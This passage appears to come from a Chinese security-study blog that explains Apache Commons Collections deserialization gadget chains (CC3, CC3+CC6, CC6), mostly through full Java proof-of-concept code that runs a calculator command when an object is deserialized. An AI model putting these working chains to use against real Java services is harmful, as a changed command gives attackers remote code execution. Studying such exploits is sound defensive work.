构建成 Test.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ClassToBase64"><a href="#ClassToBase64" class="headerlink" title="ClassToBase64"></a>ClassToBase64</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassToBase64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Path\\Test.class&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>)file.length()];</span><br><span class="line">            in.read(bytes);</span><br><span class="line">            in.close();</span><br><span class="line">            <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">            System.out.println(encoded);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>构造方法调用了 <code>newTransformer()</code>，TrAXFilter 未继承 Serializable</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231121211010722.png" alt="image-20231121211010722"></p><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><h4 id="transform"><a href="#transform" class="headerlink" title="transform()"></a>transform()</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231121211629321.png" alt="image-20231121211629321"></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldName</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">        fieldName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldName.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Compiler\\Idea\\target\\classes\\xyz\\Gadget\\CC3\\Test.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC1连接</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC3-CC6"><a href="#CC3-CC6" class="headerlink" title="CC3+CC6"></a>CC3+CC6</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldName</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">        fieldName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldName.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Compiler\\Idea\\target\\classes\\xyz\\Gadget\\CC3\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeformers = &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// fakeformers 绕开put</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; innerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(chainedTransformer,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Deserialize </tag>
            
            <tag> CommonsCollections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC6</title>
      <link href="/2023/11/17/java/cc/CC6/"/>
      <url>/2023/11/17/java/cc/CC6/</url>
      
        <content type="html"><![CDATA[<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><h3 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                       org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                       org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    From：</span></span><br><span class="line"><span class="comment">    ysoserial</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>后面跟CC1一样，关注变化</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><h4 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117203128744.png" alt="image-20231117203128744"></p><h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue()"></a>getValue()</h4><p>利用成：<code>LazyMap.get()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117203125346.png" alt="image-20231117203125346"></p><p>构造方法</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117210729199.png" alt="image-20231117210729199"></p><p>运行会发现，在序列化的时候就会触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><h4 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117214323543.png" alt="image-20231117214323543"></p><h4 id="decorate"><a href="#decorate" class="headerlink" title="decorate"></a>decorate</h4><p><img 